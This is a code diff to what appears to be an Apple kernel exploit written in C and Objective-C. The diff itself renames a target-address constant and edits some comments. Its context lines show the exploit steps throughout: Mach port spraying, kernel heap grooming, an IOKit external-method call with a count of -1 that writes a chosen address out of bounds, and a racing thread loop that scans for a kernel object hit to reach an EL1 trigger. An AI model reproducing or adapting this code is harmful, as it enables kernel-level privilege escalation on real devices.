@@ -80,7 +80,7 @@ static void spray(void) {
         g_ports[g_port_count++] = p;
     }
     ev("SPRAY socks=%d ports=%d target=0x%016llx",
-       g_sock_count, g_port_count, (unsigned long long)TARGET_ADDR);
+       g_sock_count, g_port_count, (unsigned long long)COMMPAGE_TARGET);
 }
 
 static void fire_el1_trigger(mach_port_t port, int idx, natural_t kotype,
@@ -102,7 +102,7 @@ static void scan_background(void) {
         kern_return_t kr = mach_port_kobject(mach_task_self(), g_ports[i], &kotype, &kobject);
         if (kr != KERN_SUCCESS) continue;
 
-        if (kobject == TARGET_ADDR) {
+        if (kobject == COMMPAGE_TARGET) {
             if (kotype == 2) {
                 g_found = 1;
                 ev("HIT port=%d kotype=%u kobject=0x%016llx -> EL1 trigger",
@@ -179,23 +179,23 @@ static kern_return_t sel7_q(io_connect_t conn, uint32_t gid) {
 static void do_f109(io_connect_t conn) {
     ev("PH START groom=%d", GROOM_COUNT);
 
-    /* Phase A: groom heap with 104-byte groups (count=4, element_size=24) */
+    /* Phase A: groom heap_var with 104-byte groups (count=4, element_size=24) */
     uint32_t gids[GROOM_COUNT];
     int ngids = 0;
     for (int i = 0; i < GROOM_COUNT; i++) {
         uint64_t g = sgar_q(conn, 4);
         if (g) gids[ngids++] = (uint32_t)g;
     }
-    ev("PH_GROOM done=%d/%d (heap 104B)", ngids, GROOM_COUNT);
+    ev("PH_GROOM done=%d/%d (heap_var 104B)", ngids, GROOM_COUNT);
 
-    /* Phase B: single-call OOB — count=-1, entry region = TARGET_ADDR */
+    /* Phase B: single-call OOB — count=-1, entry region = COMMPAGE_TARGET */
     {
         static uint8_t s[SGAR_STRUCT_SIZE];
         uint8_t out[0x10]; size_t out_sz = sizeof(out); uint32_t cnt = 0;
         memset(s, 0, sizeof(s));
         *(uint32_t *)(s + SGAR_COUNT_OFF) = 0xFFFFFFFFu;
         for (uint32_t off = SGAR_ENTRY_OFF; off + 8 <= SGAR_STRUCT_SIZE; off += 8)
-            *(uint64_t *)(s + off) = TARGET_ADDR;
+            *(uint64_t *)(s + off) = COMMPAGE_TARGET;
         kern_return_t kr = IOConnectCallMethod(conn, SGAR_SELECTOR,
             NULL, 0, s, sizeof(s), NULL, &cnt, out, &out_sz);
         uint64_t gid = (kr == KERN_SUCCESS) ? *(uint64_t *)out : 0;
@@ -214,7 +214,7 @@ static void do_f109(io_connect_t conn) {
         *(uint32_t *)(s + 0x04) = gids[i];     /* also at [4] */
         *(uint32_t *)(s + SGAR_COUNT_OFF) = 0xFFFFFFFFu;
         for (uint32_t off = SGAR_ENTRY_OFF; off + 8 <= SGAR_STRUCT_SIZE; off += 8)
-            *(uint64_t *)(s + off) = TARGET_ADDR;
+            *(uint64_t *)(s + off) = COMMPAGE_TARGET;
         kern_return_t kr = IOConnectCallMethod(conn, SGAR_SELECTOR,
             NULL, 0, s, sizeof(s), NULL, &cnt, out, &out_sz);
         if (kr == KERN_SUCCESS) c_hits++;
@@ -256,7 +256,7 @@ static void do_f109(io_connect_t conn) {
                 if (!rs) { atomic_store(&race_stop, 1); return; }
                 *(uint32_t *)(rs + SGAR_COUNT_OFF) = 0xFFFFFFFFu;
                 for (uint32_t off = SGAR_ENTRY_OFF; off + 8 <= SGAR_STRUCT_SIZE; off += 8)
-                    *(uint64_t *)(rs + off) = TARGET_ADDR;
+                    *(uint64_t *)(rs + off) = COMMPAGE_TARGET;
                 int wins = 0;
                 for (int i = 0; i < RACE_ITERS && !race_stop && !g_found; i++) {
                     uint32_t tgt = race_gids_b[i % race_ngids];
@@ -319,7 +319,7 @@ static void do_f109(io_connect_t conn) {
                                    selector:@selector(scanTick:)
                                    userInfo:nil repeats:YES];
 
-    /* phase overflow: 2s delay to let spray settle in heap */
+    /* phase overflow: 2s delay to let spray settle in heap_var */
     __weak AppDelegate *ws = self;
     [NSTimer scheduledTimerWithTimeInterval:2.0
                                      target:self
